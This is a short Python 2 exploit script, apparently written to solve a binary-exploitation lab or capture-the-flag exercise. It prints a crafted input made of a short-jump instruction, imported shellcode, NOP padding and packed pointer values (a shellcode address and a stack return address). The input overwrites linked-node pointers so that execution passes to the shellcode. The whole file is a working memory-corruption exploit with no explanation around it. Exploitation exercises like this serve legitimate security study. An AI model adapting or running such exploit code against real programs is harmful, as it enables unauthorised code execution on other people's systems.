from shellcode import shellcode
from struct import pack
nodea = 0x080f3718
shell_ptr = 0x080f3750
#nodeb = 0x080f3748
#retaddr = 0x804910d
retaddr = 0xbffee2e8+4
print "a"
print "\xeb\x06ignore"+shellcode+9*"\x90"+pack("<I",shell_ptr) + pack("<I", retaddr)
#jump short six bytes
print "c"